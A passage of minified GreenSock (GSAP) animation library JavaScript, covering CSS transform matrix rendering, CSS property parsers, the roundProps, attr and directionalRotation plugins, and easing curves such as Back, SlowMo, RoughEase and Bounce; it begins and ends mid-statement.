e,i,s,r,n,a,o,h,l,_,u,c,p,m,d,g,v,y,T,x,w,b,P,k=this.data,O=this.t.style,S=k.rotation,R=k.rotationX,A=k.rotationY,C=k.scaleX,D=k.scaleY,M=k.scaleZ,F=k.x,I=k.y,N=k.z,X=k.svg,L=k.perspective,E=k.force3D;if(((1===t||0===t)&&"auto"===E&&(this.tween._totalTime===this.tween._totalDuration||!this.tween._totalTime)||!E)&&!N&&!L&&!A&&!R||xt&&X||!Ot)return void(S||k.skewX||X?(S*=z,b=k.skewX*z,P=1e5,e=Math.cos(S)*C,r=Math.sin(S)*C,i=Math.sin(S-b)*-D,n=Math.cos(S-b)*D,b&&"simple"===k.skewType&&(v=Math.tan(b),v=Math.sqrt(1+v*v),i*=v,n*=v,k.skewY&&(e*=v,r*=v)),X&&(F+=k.xOrigin-(k.xOrigin*e+k.yOrigin*i)+k.xOffset,I+=k.yOrigin-(k.xOrigin*r+k.yOrigin*n)+k.yOffset,xt&&(k.xPercent||k.yPercent)&&(m=this.t.getBBox(),F+=.01*k.xPercent*m.width,I+=.01*k.yPercent*m.height),m=1e-6,m>F&&F>-m&&(F=0),m>I&&I>-m&&(I=0)),T=(e*P|0)/P+","+(r*P|0)/P+","+(i*P|0)/P+","+(n*P|0)/P+","+F+","+I+")",X&&xt?this.t.setAttribute("transform","matrix("+T):O[bt]=(k.xPercent||k.yPercent?"translate("+k.xPercent+"%,"+k.yPercent+"%) matrix(":"matrix(")+T):O[bt]=(k.xPercent||k.yPercent?"translate("+k.xPercent+"%,"+k.yPercent+"%) matrix(":"matrix(")+C+",0,0,"+D+","+F+","+I+")");if(f&&(m=1e-4,m>C&&C>-m&&(C=M=2e-5),m>D&&D>-m&&(D=M=2e-5),!L||k.z||k.rotationX||k.rotationY||(L=0)),S||k.skewX)S*=z,d=e=Math.cos(S),g=r=Math.sin(S),k.skewX&&(S-=k.skewX*z,d=Math.cos(S),g=Math.sin(S),"simple"===k.skewType&&(v=Math.tan(k.skewX*z),v=Math.sqrt(1+v*v),d*=v,g*=v,k.skewY&&(e*=v,r*=v))),i=-g,n=d;else{if(!(A||R||1!==M||L||X))return void(O[bt]=(k.xPercent||k.yPercent?"translate("+k.xPercent+"%,"+k.yPercent+"%) translate3d(":"translate3d(")+F+"px,"+I+"px,"+N+"px)"+(1!==C||1!==D?" scale("+C+","+D+")":""));e=n=1,i=r=0}l=1,s=a=o=h=_=u=0,c=L?-1/L:0,p=k.zOrigin,m=1e-6,x=",",w="0",S=A*z,S&&(d=Math.cos(S),g=Math.sin(S),o=-g,_=c*-g,s=e*g,a=r*g,l=d,c*=d,e*=d,r*=d),S=R*z,S&&(d=Math.cos(S),g=Math.sin(S),v=i*d+s*g,y=n*d+a*g,h=l*g,u=c*g,s=i*-g+s*d,a=n*-g+a*d,l*=d,c*=d,i=v,n=y),1!==M&&(s*=M,a*=M,l*=M,c*=M),1!==D&&(i*=D,n*=D,h*=D,u*=D),1!==C&&(e*=C,r*=C,o*=C,_*=C),(p||X)&&(p&&(F+=s*-p,I+=a*-p,N+=l*-p+p),X&&(F+=k.xOrigin-(k.xOrigin*e+k.yOrigin*i)+k.xOffset,I+=k.yOrigin-(k.xOrigin*r+k.yOrigin*n)+k.yOffset),m>F&&F>-m&&(F=w),m>I&&I>-m&&(I=w),m>N&&N>-m&&(N=0)),T=k.xPercent||k.yPercent?"translate("+k.xPercent+"%,"+k.yPercent+"%) matrix3d(":"matrix3d(",T+=(m>e&&e>-m?w:e)+x+(m>r&&r>-m?w:r)+x+(m>o&&o>-m?w:o),T+=x+(m>_&&_>-m?w:_)+x+(m>i&&i>-m?w:i)+x+(m>n&&n>-m?w:n),R||A?(T+=x+(m>h&&h>-m?w:h)+x+(m>u&&u>-m?w:u)+x+(m>s&&s>-m?w:s),T+=x+(m>a&&a>-m?w:a)+x+(m>l&&l>-m?w:l)+x+(m>c&&c>-m?w:c)+x):T+=",0,0,0,0,1,0,",T+=F+x+I+x+N+x+(L?1+-N/L:1)+")",O[bt]=T};l=St.prototype,l.x=l.y=l.z=l.skewX=l.skewY=l.rotation=l.rotationX=l.rotationY=l.zOrigin=l.xPercent=l.yPercent=l.xOffset=l.yOffset=0,l.scaleX=l.scaleY=l.scaleZ=1,yt("transform,scale,scaleX,scaleY,scaleZ,x,y,z,rotation,rotationX,rotationY,rotationZ,skewX,skewY,shortRotation,shortRotationX,shortRotationY,shortRotationZ,transformOrigin,svgOrigin,transformPerspective,directionalRotation,parseTransform,force3D,skewType,xPercent,yPercent,smoothOrigin",{parser:function(t,e,i,s,n,o,h){if(s._lastParsedTransform===h)return n;s._lastParsedTransform=h;var l,_,u,c,f,p,m,d,g,v=t._gsTransform,y=s._transform=Nt(t,r,!0,h.parseTransform),T=t.style,x=1e-6,w=wt.length,b=h,P={},k="transformOrigin";if("string"==typeof b.transform&&bt)u=L.style,u[bt]=b.transform,u.display="block",u.position="absolute",N.body.appendChild(L),l=Nt(L,null,!1),N.body.removeChild(L),null!=b.xPercent&&(l.xPercent=nt(b.xPercent,y.xPercent)),null!=b.yPercent&&(l.yPercent=nt(b.yPercent,y.yPercent));else if("object"==typeof b){if(l={scaleX:nt(null!=b.scaleX?b.scaleX:b.scale,y.scaleX),scaleY:nt(null!=b.scaleY?b.scaleY:b.scale,y.scaleY),scaleZ:nt(b.scaleZ,y.scaleZ),x:nt(b.x,y.x),y:nt(b.y,y.y),z:nt(b.z,y.z),xPercent:nt(b.xPercent,y.xPercent),yPercent:nt(b.yPercent,y.yPercent),perspective:nt(b.transformPerspective,y.perspective)},m=b.directionalRotation,null!=m)if("object"==typeof m)for(u in m)b[u]=m[u];else b.rotation=m;"string"==typeof b.x&&-1!==b.x.indexOf("%")&&(l.x=0,l.xPercent=nt(b.x,y.xPercent)),"string"==typeof b.y&&-1!==b.y.indexOf("%")&&(l.y=0,l.yPercent=nt(b.y,y.yPercent)),l.rotation=at("rotation"in b?b.rotation:"shortRotation"in b?b.shortRotation+"_short":"rotationZ"in b?b.rotationZ:y.rotation,y.rotation,"rotation",P),Ot&&(l.rotationX=at("rotationX"in b?b.rotationX:"shortRotationX"in b?b.shortRotationX+"_short":y.rotationX||0,y.rotationX,"rotationX",P),l.rotationY=at("rotationY"in b?b.rotationY:"shortRotationY"in b?b.shortRotationY+"_short":y.rotationY||0,y.rotationY,"rotationY",P)),l.skewX=null==b.skewX?y.skewX:at(b.skewX,y.skewX),l.skewY=null==b.skewY?y.skewY:at(b.skewY,y.skewY),(_=l.skewY-y.skewY)&&(l.skewX+=_,l.rotation+=_)}for(Ot&&null!=b.force3D&&(y.force3D=b.force3D,p=!0),y.skewType=b.skewType||y.skewType||a.defaultSkewType,f=y.force3D||y.z||y.rotationX||y.rotationY||l.z||l.rotationX||l.rotationY||l.perspective,f||null==b.scale||(l.scaleZ=1);--w>-1;)i=wt[w],c=l[i]-y[i],(c>x||-x>c||null!=b[i]||null!=I[i])&&(p=!0,n=new pt(y,i,y[i],c,n),i in P&&(n.e=P[i]),n.xs0=0,n.plugin=o,s._overwriteProps.push(n.n));return c=b.transformOrigin,y.svg&&(c||b.svgOrigin)&&(d=y.xOffset,g=y.yOffset,Mt(t,st(c),l,b.svgOrigin,b.smoothOrigin),n=mt(y,"xOrigin",(v?y:l).xOrigin,l.xOrigin,n,k),n=mt(y,"yOrigin",(v?y:l).yOrigin,l.yOrigin,n,k),(d!==y.xOffset||g!==y.yOffset)&&(n=mt(y,"xOffset",v?d:y.xOffset,y.xOffset,n,k),n=mt(y,"yOffset",v?g:y.yOffset,y.yOffset,n,k)),c=xt?null:"0px 0px"),(c||Ot&&f&&y.zOrigin)&&(bt?(p=!0,i=kt,c=(c||$(t,i,r,!1,"50% 50%"))+"",n=new pt(T,i,0,0,n,-1,k),n.b=T[i],n.plugin=o,Ot?(u=y.zOrigin,c=c.split(" "),y.zOrigin=(c.length>2&&(0===u||"0px"!==c[2])?parseFloat(c[2]):u)||0,n.xs0=n.e=c[0]+" "+(c[1]||"50%")+" 0px",n=new pt(y,"zOrigin",0,0,n,-1,n.n),n.b=u,n.xs0=n.e=y.zOrigin):n.xs0=n.e=c):st(c+"",y)),p&&(s._transformType=y.svg&&xt||!f&&3!==this._transformType?2:3),n},prefix:!0}),yt("boxShadow",{defaultValue:"0px 0px 0px 0px #999",prefix:!0,color:!0,multi:!0,keyword:"inset"}),yt("borderRadius",{defaultValue:"0px",parser:function(t,e,i,n,a,o){e=this.format(e);var h,l,_,u,c,f,p,m,d,g,v,y,T,x,w,b,P=["borderTopLeftRadius","borderTopRightRadius","borderBottomRightRadius","borderBottomLeftRadius"],k=t.style;for(d=parseFloat(t.offsetWidth),g=parseFloat(t.offsetHeight),h=e.split(" "),l=0;l<P.length;l++)this.p.indexOf("border")&&(P[l]=Z(P[l])),c=u=$(t,P[l],r,!1,"0px"),-1!==c.indexOf(" ")&&(u=c.split(" "),c=u[0],u=u[1]),f=_=h[l],p=parseFloat(c),y=c.substr((p+"").length),T="="===f.charAt(1),T?(m=parseInt(f.charAt(0)+"1",10),f=f.substr(2),m*=parseFloat(f),v=f.substr((m+"").length-(0>m?1:0))||""):(m=parseFloat(f),v=f.substr((m+"").length)),""===v&&(v=s[i]||y),v!==y&&(x=Q(t,"borderLeft",p,y),w=Q(t,"borderTop",p,y),"%"===v?(c=x/d*100+"%",u=w/g*100+"%"):"em"===v?(b=Q(t,"borderLeft",1,"em"),c=x/b+"em",u=w/b+"em"):(c=x+"px",u=w+"px"),T&&(f=parseFloat(c)+m+v,_=parseFloat(u)+m+v)),a=dt(k,P[l],c+" "+u,f+" "+_,!1,"0px",a);return a},prefix:!0,formatter:ut("0px 0px 0px 0px",!1,!0)}),yt("backgroundPosition",{defaultValue:"0 0",parser:function(t,e,i,s,n,a){var o,h,l,_,u,c,f="background-position",p=r||G(t,null),d=this.format((p?m?p.getPropertyValue(f+"-x")+" "+p.getPropertyValue(f+"-y"):p.getPropertyValue(f):t.currentStyle.backgroundPositionX+" "+t.currentStyle.backgroundPositionY)||"0 0"),g=this.format(e);if(-1!==d.indexOf("%")!=(-1!==g.indexOf("%"))&&(c=$(t,"backgroundImage").replace(S,""),c&&"none"!==c)){for(o=d.split(" "),h=g.split(" "),E.setAttribute("src",c),l=2;--l>-1;)d=o[l],_=-1!==d.indexOf("%"),_!==(-1!==h[l].indexOf("%"))&&(u=0===l?t.offsetWidth-E.width:t.offsetHeight-E.height,o[l]=_?parseFloat(d)/100*u+"px":parseFloat(d)/u*100+"%");d=o.join(" ")}return this.parseComplex(t.style,d,g,n,a)},formatter:st}),yt("backgroundSize",{defaultValue:"0 0",formatter:st}),yt("perspective",{defaultValue:"0px",prefix:!0}),yt("perspectiveOrigin",{defaultValue:"50% 50%",prefix:!0}),yt("transformStyle",{prefix:!0}),yt("backfaceVisibility",{prefix:!0}),yt("userSelect",{prefix:!0}),yt("margin",{parser:ct("marginTop,marginRight,marginBottom,marginLeft")}),yt("padding",{parser:ct("paddingTop,paddingRight,paddingBottom,paddingLeft")}),yt("clip",{defaultValue:"rect(0px,0px,0px,0px)",parser:function(t,e,i,s,n,a){var o,h,l;return 9>m?(h=t.currentStyle,l=8>m?" ":",",o="rect("+h.clipTop+l+h.clipRight+l+h.clipBottom+l+h.clipLeft+")",e=this.format(e).split(",").join(l)):(o=this.format($(t,this.p,r,!1,this.dflt)),e=this.format(e)),this.parseComplex(t.style,o,e,n,a)}}),yt("textShadow",{defaultValue:"0px 0px 0px #999",color:!0,multi:!0}),yt("autoRound,strictUnits",{parser:function(t,e,i,s,r){return r}}),yt("border",{defaultValue:"0px solid #000",parser:function(t,e,i,s,n,a){return this.parseComplex(t.style,this.format($(t,"borderTopWidth",r,!1,"0px")+" "+$(t,"borderTopStyle",r,!1,"solid")+" "+$(t,"borderTopColor",r,!1,"#000")),this.format(e),n,a)},color:!0,formatter:function(t){var e=t.split(" ");return e[0]+" "+(e[1]||"solid")+" "+(t.match(_t)||["#000"])[0]}}),yt("borderWidth",{parser:ct("borderTopWidth,borderRightWidth,borderBottomWidth,borderLeftWidth")}),yt("float,cssFloat,styleFloat",{parser:function(t,e,i,s,r,n){var a=t.style,o="cssFloat"in a?"cssFloat":"styleFloat";return new pt(a,o,0,0,r,-1,i,!1,0,a[o],e)}});var Et=function(t){var e,i=this.t,s=i.filter||$(this.data,"filter")||"",r=this.s+this.c*t|0;100===r&&(-1===s.indexOf("atrix(")&&-1===s.indexOf("radient(")&&-1===s.indexOf("oader(")?(i.removeAttribute("filter"),e=!$(this.data,"filter")):(i.filter=s.replace(b,""),e=!0)),e||(this.xn1&&(i.filter=s=s||"alpha(opacity="+r+")"),-1===s.indexOf("pacity")?0===r&&this.xn1||(i.filter=s+" alpha(opacity="+r+")"):i.filter=s.replace(x,"opacity="+r))};yt("opacity,alpha,autoAlpha",{defaultValue:"1",parser:function(t,e,i,s,n,a){var o=parseFloat($(t,"opacity",r,!1,"1")),h=t.style,l="autoAlpha"===i;return"string"==typeof e&&"="===e.charAt(1)&&(e=("-"===e.charAt(0)?-1:1)*parseFloat(e.substr(2))+o),l&&1===o&&"hidden"===$(t,"visibility",r)&&0!==e&&(o=0),
j?n=new pt(h,"opacity",o,e-o,n):(n=new pt(h,"opacity",100*o,100*(e-o),n),n.xn1=l?1:0,h.zoom=1,n.type=2,n.b="alpha(opacity="+n.s+")",n.e="alpha(opacity="+(n.s+n.c)+")",n.data=t,n.plugin=a,n.setRatio=Et),l&&(n=new pt(h,"visibility",0,0,n,-1,null,!1,0,0!==o?"inherit":"hidden",0===e?"hidden":"inherit"),n.xs0="inherit",s._overwriteProps.push(n.n),s._overwriteProps.push(i)),n}});var Yt=function(t,e){e&&(t.removeProperty?(("ms"===e.substr(0,2)||"webkit"===e.substr(0,6))&&(e="-"+e),t.removeProperty(e.replace(k,"-$1").toLowerCase())):t.removeAttribute(e))},Bt=function(t){if(this.t._gsClassPT=this,1===t||0===t){this.t.setAttribute("class",0===t?this.b:this.e);for(var e=this.data,i=this.t.style;e;)e.v?i[e.p]=e.v:Yt(i,e.p),e=e._next;1===t&&this.t._gsClassPT===this&&(this.t._gsClassPT=null)}else this.t.getAttribute("class")!==this.e&&this.t.setAttribute("class",this.e)};yt("className",{parser:function(t,e,s,n,a,o,h){var l,_,u,c,f,p=t.getAttribute("class")||"",m=t.style.cssText;if(a=n._classNamePT=new pt(t,s,0,0,a,2),a.setRatio=Bt,a.pr=-11,i=!0,a.b=p,_=K(t,r),u=t._gsClassPT){for(c={},f=u.data;f;)c[f.p]=1,f=f._next;u.setRatio(1)}return t._gsClassPT=a,a.e="="!==e.charAt(1)?e:p.replace(new RegExp("\\s*\\b"+e.substr(2)+"\\b"),"")+("+"===e.charAt(0)?" "+e.substr(2):""),t.setAttribute("class",a.e),l=J(t,_,K(t),h,c),t.setAttribute("class",p),a.data=l.firstMPT,t.style.cssText=m,a=a.xfirst=n.parse(t,l.difs,a,o)}});var jt=function(t){if((1===t||0===t)&&this.data._totalTime===this.data._totalDuration&&"isFromStart"!==this.data.data){var e,i,s,r,n,a=this.t.style,o=h.transform.parse;if("all"===this.e)a.cssText="",r=!0;else for(e=this.e.split(" ").join("").split(","),s=e.length;--s>-1;)i=e[s],h[i]&&(h[i].parse===o?r=!0:i="transformOrigin"===i?kt:h[i].p),Yt(a,i);r&&(Yt(a,bt),n=this.t._gsTransform,n&&(n.svg&&this.t.removeAttribute("data-svg-origin"),delete this.t._gsTransform))}};for(yt("clearProps",{parser:function(t,e,s,r,n){return n=new pt(t,s,0,0,n,2),n.setRatio=jt,n.e=e,n.pr=-10,n.data=r._tween,i=!0,n}}),l="bezier,throwProps,physicsProps,physics2D".split(","),gt=l.length;gt--;)Tt(l[gt]);l=a.prototype,l._firstPT=l._lastParsedTransform=l._transform=null,l._onInitTween=function(t,e,o){if(!t.nodeType)return!1;this._target=t,this._tween=o,this._vars=e,_=e.autoRound,i=!1,s=e.suffixMap||a.suffixMap,r=G(t,""),n=this._overwriteProps;var l,f,m,d,g,v,y,T,x,b=t.style;if(u&&""===b.zIndex&&(l=$(t,"zIndex",r),("auto"===l||""===l)&&this._addLazySet(b,"zIndex",0)),"string"==typeof e&&(d=b.cssText,l=K(t,r),b.cssText=d+";"+e,l=J(t,l,K(t)).difs,!j&&w.test(e)&&(l.opacity=parseFloat(RegExp.$1)),e=l,b.cssText=d),e.className?this._firstPT=f=h.className.parse(t,e.className,"className",this,null,null,e):this._firstPT=f=this.parse(t,e,null),this._transformType){for(x=3===this._transformType,bt?c&&(u=!0,""===b.zIndex&&(y=$(t,"zIndex",r),("auto"===y||""===y)&&this._addLazySet(b,"zIndex",0)),p&&this._addLazySet(b,"WebkitBackfaceVisibility",this._vars.WebkitBackfaceVisibility||(x?"visible":"hidden"))):b.zoom=1,m=f;m&&m._next;)m=m._next;T=new pt(t,"transform",0,0,null,2),this._linkCSSP(T,null,m),T.setRatio=bt?Lt:Xt,T.data=this._transform||Nt(t,r,!0),T.tween=o,T.pr=-1,n.pop()}if(i){for(;f;){for(v=f._next,m=d;m&&m.pr>f.pr;)m=m._next;(f._prev=m?m._prev:g)?f._prev._next=f:d=f,(f._next=m)?m._prev=f:g=f,f=v}this._firstPT=d}return!0},l.parse=function(t,e,i,n){var a,o,l,u,c,f,p,m,d,g,v=t.style;for(a in e)f=e[a],o=h[a],o?i=o.parse(t,f,a,this,i,n,e):(c=$(t,a,r)+"",d="string"==typeof f,"color"===a||"fill"===a||"stroke"===a||-1!==a.indexOf("Color")||d&&P.test(f)?(d||(f=lt(f),f=(f.length>3?"rgba(":"rgb(")+f.join(",")+")"),i=dt(v,a,c,f,!0,"transparent",i,0,n)):!d||-1===f.indexOf(" ")&&-1===f.indexOf(",")?(l=parseFloat(c),p=l||0===l?c.substr((l+"").length):"",(""===c||"auto"===c)&&("width"===a||"height"===a?(l=it(t,a,r),p="px"):"left"===a||"top"===a?(l=H(t,a,r),p="px"):(l="opacity"!==a?0:1,p="")),g=d&&"="===f.charAt(1),g?(u=parseInt(f.charAt(0)+"1",10),f=f.substr(2),u*=parseFloat(f),m=f.replace(T,"")):(u=parseFloat(f),m=d?f.replace(T,""):""),""===m&&(m=a in s?s[a]:p),f=u||0===u?(g?u+l:u)+m:e[a],p!==m&&""!==m&&(u||0===u)&&l&&(l=Q(t,a,l,p),"%"===m?(l/=Q(t,a,100,"%")/100,e.strictUnits!==!0&&(c=l+"%")):"em"===m?l/=Q(t,a,1,"em"):"px"!==m&&(u=Q(t,a,u,m),m="px"),g&&(u||0===u)&&(f=u+l+m)),g&&(u+=l),!l&&0!==l||!u&&0!==u?void 0!==v[a]&&(f||f+""!="NaN"&&null!=f)?(i=new pt(v,a,u||l||0,0,i,-1,a,!1,0,c,f),i.xs0="none"!==f||"display"!==a&&-1===a.indexOf("Style")?f:c):V("invalid "+a+" tween value: "+e[a]):(i=new pt(v,a,l,u-l,i,0,a,_!==!1&&("px"===m||"zIndex"===a),0,c,f),i.xs0=m)):i=dt(v,a,c,f,!0,null,i,0,n)),n&&i&&!i.plugin&&(i.plugin=n);return i},l.setRatio=function(t){var e,i,s,r=this._firstPT,n=1e-6;if(1!==t||this._tween._time!==this._tween._duration&&0!==this._tween._time)if(t||this._tween._time!==this._tween._duration&&0!==this._tween._time||this._tween._rawPrevTime===-1e-6)for(;r;){if(e=r.c*t+r.s,r.r?e=Math.round(e):n>e&&e>-n&&(e=0),r.type)if(1===r.type)if(s=r.l,2===s)r.t[r.p]=r.xs0+e+r.xs1+r.xn1+r.xs2;else if(3===s)r.t[r.p]=r.xs0+e+r.xs1+r.xn1+r.xs2+r.xn2+r.xs3;else if(4===s)r.t[r.p]=r.xs0+e+r.xs1+r.xn1+r.xs2+r.xn2+r.xs3+r.xn3+r.xs4;else if(5===s)r.t[r.p]=r.xs0+e+r.xs1+r.xn1+r.xs2+r.xn2+r.xs3+r.xn3+r.xs4+r.xn4+r.xs5;else{for(i=r.xs0+e+r.xs1,s=1;s<r.l;s++)i+=r["xn"+s]+r["xs"+(s+1)];r.t[r.p]=i}else-1===r.type?r.t[r.p]=r.xs0:r.setRatio&&r.setRatio(t);else r.t[r.p]=e+r.xs0;r=r._next}else for(;r;)2!==r.type?r.t[r.p]=r.b:r.setRatio(t),r=r._next;else for(;r;){if(2!==r.type)if(r.r&&-1!==r.type)if(e=Math.round(r.s+r.c),r.type){if(1===r.type){for(s=r.l,i=r.xs0+e+r.xs1,s=1;s<r.l;s++)i+=r["xn"+s]+r["xs"+(s+1)];r.t[r.p]=i}}else r.t[r.p]=e+r.xs0;else r.t[r.p]=r.e;else r.setRatio(t);r=r._next}},l._enableTransforms=function(t){this._transform=this._transform||Nt(this._target,r,!0),this._transformType=this._transform.svg&&xt||!t&&3!==this._transformType?2:3};var Ut=function(t){this.t[this.p]=this.e,this.data._linkCSSP(this,this._next,null,!0)};l._addLazySet=function(t,e,i){var s=this._firstPT=new pt(t,e,0,0,this._firstPT,2);s.e=i,s.setRatio=Ut,s.data=this},l._linkCSSP=function(t,e,i,s){return t&&(e&&(e._prev=t),t._next&&(t._next._prev=t._prev),t._prev?t._prev._next=t._next:this._firstPT===t&&(this._firstPT=t._next,s=!0),i?i._next=t:s||null!==this._firstPT||(this._firstPT=t),t._next=e,t._prev=i),t},l._kill=function(e){var i,s,r,n=e;if(e.autoAlpha||e.alpha){n={};for(s in e)n[s]=e[s];n.opacity=1,n.autoAlpha&&(n.visibility=1)}return e.className&&(i=this._classNamePT)&&(r=i.xfirst,r&&r._prev?this._linkCSSP(r._prev,i._next,r._prev._prev):r===this._firstPT&&(this._firstPT=i._next),i._next&&this._linkCSSP(i._next,i._next._next,r._prev),this._classNamePT=null),t.prototype._kill.call(this,n)};var Vt=function(t,e,i){var s,r,n,a;if(t.slice)for(r=t.length;--r>-1;)Vt(t[r],e,i);else for(s=t.childNodes,r=s.length;--r>-1;)n=s[r],a=n.type,n.style&&(e.push(K(n)),i&&i.push(n)),1!==a&&9!==a&&11!==a||!n.childNodes.length||Vt(n,e,i)};return a.cascadeTo=function(t,i,s){var r,n,a,o,h=e.to(t,i,s),l=[h],_=[],u=[],c=[],f=e._internals.reservedProps;for(t=h._targets||h.target,Vt(t,_,c),h.render(i,!0,!0),Vt(t,u),h.render(0,!0,!0),h._enabled(!0),r=c.length;--r>-1;)if(n=J(c[r],_[r],u[r]),n.firstMPT){n=n.difs;for(a in s)f[a]&&(n[a]=s[a]);o={};for(a in n)o[a]=_[r][a];l.push(e.fromTo(c[r],i,o,n))}return l},t.activate([a]),a},!0),function(){var t=_gsScope._gsDefine.plugin({propName:"roundProps",priority:-1,API:2,init:function(t,e,i){return this._tween=i,!0}}),e=t.prototype;e._onInitAllProps=function(){for(var t,e,i,s=this._tween,r=s.vars.roundProps instanceof Array?s.vars.roundProps:s.vars.roundProps.split(","),n=r.length,a={},o=s._propLookup.roundProps;--n>-1;)a[r[n]]=1;for(n=r.length;--n>-1;)for(t=r[n],e=s._firstPT;e;)i=e._next,e.pg?e.t._roundProps(a,!0):e.n===t&&(this._add(e.t,t,e.s,e.c),i&&(i._prev=e._prev),e._prev?e._prev._next=i:s._firstPT===e&&(s._firstPT=i),e._next=e._prev=null,s._propLookup[t]=o),e=i;return!1},e._add=function(t,e,i,s){this._addTween(t,e,i,i+s,e,!0),this._overwriteProps.push(e)}}(),function(){var t=/(?:\d|\-|\+|=|#|\.)*/g,e=/[A-Za-z%]/g;_gsScope._gsDefine.plugin({propName:"attr",API:2,version:"0.4.0",init:function(i,s,r){var n,a,o,h,l;if("function"!=typeof i.setAttribute)return!1;this._target=i,this._proxy={},this._start={},this._end={},this._suffix={};for(n in s)this._start[n]=this._proxy[n]=a=i.getAttribute(n)+"",this._end[n]=o=s[n]+"",this._suffix[n]=h=e.test(o)?o.replace(t,""):e.test(a)?a.replace(t,""):"",h&&(l=o.indexOf(h),-1!==l&&(o=o.substr(0,l))),this._addTween(this._proxy,n,parseFloat(a),o,n)||(this._suffix[n]=""),"="===o.charAt(1)&&(this._end[n]=this._firstPT.s+this._firstPT.c+h),this._overwriteProps.push(n);return!0},set:function(t){this._super.setRatio.call(this,t);for(var e,i=this._overwriteProps,s=i.length,r=1===t?this._end:t?this._proxy:this._start,n=r===this._proxy;--s>-1;)e=i[s],this._target.setAttribute(e,r[e]+(n?this._suffix[e]:""))}})}(),_gsScope._gsDefine.plugin({propName:"directionalRotation",version:"0.2.1",API:2,init:function(t,e,i){"object"!=typeof e&&(e={rotation:e}),this.finals={};var s,r,n,a,o,h,l=e.useRadians===!0?2*Math.PI:360,_=1e-6;for(s in e)"useRadians"!==s&&(h=(e[s]+"").split("_"),r=h[0],n=parseFloat("function"!=typeof t[s]?t[s]:t[s.indexOf("set")||"function"!=typeof t["get"+s.substr(3)]?s:"get"+s.substr(3)]()),a=this.finals[s]="string"==typeof r&&"="===r.charAt(1)?n+parseInt(r.charAt(0)+"1",10)*Number(r.substr(2)):Number(r)||0,o=a-n,h.length&&(r=h.join("_"),-1!==r.indexOf("short")&&(o%=l,o!==o%(l/2)&&(o=0>o?o+l:o-l)),-1!==r.indexOf("_cw")&&0>o?o=(o+9999999999*l)%l-(o/l|0)*l:-1!==r.indexOf("ccw")&&o>0&&(o=(o-9999999999*l)%l-(o/l|0)*l)),(o>_||-_>o)&&(this._addTween(t,s,n,n+o,s),this._overwriteProps.push(s)));return!0},set:function(t){var e;if(1!==t)this._super.setRatio.call(this,t);else for(e=this._firstPT;e;)e.f?e.t[e.p](this.finals[e.p]):e.t[e.p]=this.finals[e.p],e=e._next}})._autoCSS=!0,_gsScope._gsDefine("easing.Back",["easing.Ease"],function(t){var e,i,s,r=_gsScope.GreenSockGlobals||_gsScope,n=r.com.greensock,a=2*Math.PI,o=Math.PI/2,h=n._class,l=function(e,i){var s=h("easing."+e,function(){},!0),r=s.prototype=new t;return r.constructor=s,r.getRatio=i,s},_=t.register||function(){},u=function(t,e,i,s,r){var n=h("easing."+t,{easeOut:new e,easeIn:new i,easeInOut:new s},!0);return _(n,t),n},c=function(t,e,i){this.t=t,this.v=e,i&&(this.next=i,i.prev=this,this.c=i.v-e,this.gap=i.t-t)},f=function(e,i){var s=h("easing."+e,function(t){this._p1=t||0===t?t:1.70158,this._p2=1.525*this._p1},!0),r=s.prototype=new t;return r.constructor=s,r.getRatio=i,r.config=function(t){return new s(t)},s},p=u("Back",f("BackOut",function(t){return(t-=1)*t*((this._p1+1)*t+this._p1)+1}),f("BackIn",function(t){return t*t*((this._p1+1)*t-this._p1)}),f("BackInOut",function(t){return(t*=2)<1?.5*t*t*((this._p2+1)*t-this._p2):.5*((t-=2)*t*((this._p2+1)*t+this._p2)+2)})),m=h("easing.SlowMo",function(t,e,i){e=e||0===e?e:.7,null==t?t=.7:t>1&&(t=1),this._p=1!==t?e:0,this._p1=(1-t)/2,this._p2=t,this._p3=this._p1+this._p2,this._calcEnd=i===!0},!0),d=m.prototype=new t;return d.constructor=m,d.getRatio=function(t){var e=t+(.5-t)*this._p;return t<this._p1?this._calcEnd?1-(t=1-t/this._p1)*t:e-(t=1-t/this._p1)*t*t*t*e:t>this._p3?this._calcEnd?1-(t=(t-this._p3)/this._p1)*t:e+(t-e)*(t=(t-this._p3)/this._p1)*t*t*t:this._calcEnd?1:e},m.ease=new m(.7,.7),d.config=m.config=function(t,e,i){return new m(t,e,i)},e=h("easing.SteppedEase",function(t){t=t||1,this._p1=1/t,this._p2=t+1},!0),d=e.prototype=new t,d.constructor=e,d.getRatio=function(t){return 0>t?t=0:t>=1&&(t=.999999999),(this._p2*t>>0)*this._p1},d.config=e.config=function(t){return new e(t)},i=h("easing.RoughEase",function(e){e=e||{};for(var i,s,r,n,a,o,h=e.taper||"none",l=[],_=0,u=0|(e.points||20),f=u,p=e.randomize!==!1,m=e.clamp===!0,d=e.template instanceof t?e.template:null,g="number"==typeof e.strength?.4*e.strength:.4;--f>-1;)i=p?Math.random():1/u*f,s=d?d.getRatio(i):i,"none"===h?r=g:"out"===h?(n=1-i,r=n*n*g):"in"===h?r=i*i*g:.5>i?(n=2*i,r=n*n*.5*g):(n=2*(1-i),r=n*n*.5*g),p?s+=Math.random()*r-.5*r:f%2?s+=.5*r:s-=.5*r,m&&(s>1?s=1:0>s&&(s=0)),l[_++]={x:i,y:s};for(l.sort(function(t,e){return t.x-e.x}),o=new c(1,1,null),f=u;--f>-1;)a=l[f],o=new c(a.x,a.y,o);this._prev=new c(0,0,0!==o.t?o:o.next)},!0),d=i.prototype=new t,d.constructor=i,d.getRatio=function(t){var e=this._prev;if(t>e.t){for(;e.next&&t>=e.t;)e=e.next;e=e.prev}else for(;e.prev&&t<=e.t;)e=e.prev;return this._prev=e,e.v+(t-e.t)/e.gap*e.c},d.config=function(t){return new i(t)},i.ease=new i,u("Bounce",l("BounceOut",function(t){return 1/2.75>t?7.5625*t*t:2/2.75>t?7.5625*(t-=1.5/2.75)*t+.75:2.5/2.75>t?7.5625*(t-=2.25/2.75)*t+.9375:7.5625*(t-=2.625/2.75)*t+.984375}),l("BounceIn",function(t){return(t=1-t)<1/2.75?1-7.5625*t*t:2/2.75>t?1-(7.5625*(t-=1.5/2.75)*t+.75):2.5/2.75>t?1-(7.5625*(t-=2.25/2.75)*t+.9375):1-(7.5625*(t-=2.625/2.75)*t+.984375)}),l("BounceInOut",function(t){var e=.5>t;return t=e?1-2*t:2*t-1,t=1/2.75>t?7.5625*t*t:2/2.75>t?7.5625*(t-=1.5/2.75)*t+.75:2.5/2.75>t?7.5625*(t-=2.25/2.75)*t+.9375:7.5625*(t-=2.625/2.75)*t+.984375,e?.5*(1-t):.5*t+.5})),u("Circ",l("CircOut",function(t){return 